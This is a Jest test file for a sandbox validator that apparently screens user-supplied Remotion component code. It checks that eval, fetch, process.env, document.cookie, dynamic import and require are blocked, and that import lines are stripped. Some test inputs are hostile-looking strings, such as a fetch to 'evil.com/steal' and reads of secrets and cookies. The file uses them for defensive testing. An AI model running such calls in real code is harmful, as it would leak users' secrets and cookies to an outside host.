import { validateCode, sanitizeCode } from '@/lib/remotion/sandbox';

describe('validateCode', () => {
  it('allows clean Remotion component code', () => {
    const code = `
      const { useCurrentFrame, AbsoluteFill } = remotion;
      const PARAMS = { color: '#fff' };
      const Component = () => <AbsoluteFill style={{ backgroundColor: PARAMS.color }} />;
    `;
    expect(validateCode(code)).toEqual({ valid: true, errors: [] });
  });

  it('blocks eval usage', () => {
    const code = `eval('malicious code')`;
    expect(validateCode(code).valid).toBe(false);
    expect(validateCode(code).errors).toContain('Forbidden: eval');
  });

  it('blocks fetch usage', () => {
    const code = `fetch('https://evil.com/steal')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks process access', () => {
    const code = `process.env.SECRET`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks document.cookie access', () => {
    const code = `document.cookie`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks dynamic import', () => {
    const code = `import('malicious')`;
    expect(validateCode(code).valid).toBe(false);
  });

  it('blocks require', () => {
    const code = `require('fs')`;
    expect(validateCode(code).valid).toBe(false);
  });
});

describe('sanitizeCode', () => {
  it('removes remotion import statements', () => {
    const code = `import { useCurrentFrame } from 'remotion';\nconst frame = useCurrentFrame();`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'remotion'");
    expect(result).toContain('const frame = useCurrentFrame()');
  });

  it('removes react import statements', () => {
    const code = `import React from 'react';\nconst x = 1;`;
    const result = sanitizeCode(code);
    expect(result).not.toContain("from 'react'");
  });
});
